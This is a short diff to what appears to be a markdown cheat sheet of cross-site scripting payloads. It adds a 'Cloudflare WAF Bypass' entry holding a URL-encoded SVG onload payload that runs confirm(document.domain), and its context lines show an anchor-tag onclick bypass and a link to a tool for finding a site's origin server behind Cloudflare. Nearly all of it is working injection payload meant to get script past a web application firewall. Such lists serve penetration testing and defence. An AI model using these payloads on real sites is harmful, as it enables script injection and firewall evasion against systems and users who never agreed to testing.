@@ -462,6 +462,10 @@ Href Bypass
 ```
 <a"/onclick=(confirm)()>Click%20Here!
 ```
+Cloudflare WAF Bypass
+```
+%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
+```
 
 - Identify server origin
 https://github.com/gwen001/cloudflare-origin-ip
